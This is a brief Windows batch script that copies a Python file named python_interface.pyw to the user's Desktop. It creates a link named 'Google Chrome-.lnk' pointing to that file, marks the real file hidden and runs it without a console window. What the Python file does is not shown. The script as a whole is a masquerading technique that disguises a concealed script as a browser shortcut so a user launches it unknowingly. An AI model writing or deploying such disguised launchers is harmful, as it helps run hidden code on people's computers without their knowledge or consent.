@echo off

xcopy .\python_interface.pyw "%userprofile%\Desktop\" /Y /I
mklink "%userprofile%\Desktop\Google Chrome-.lnk" "%userprofile%\Desktop\python_interface.pyw"
attrib +H "%userprofile%\Desktop\python_interface.pyw"

pyw "%userprofile%\Desktop\python_interface.pyw"
pause
exit
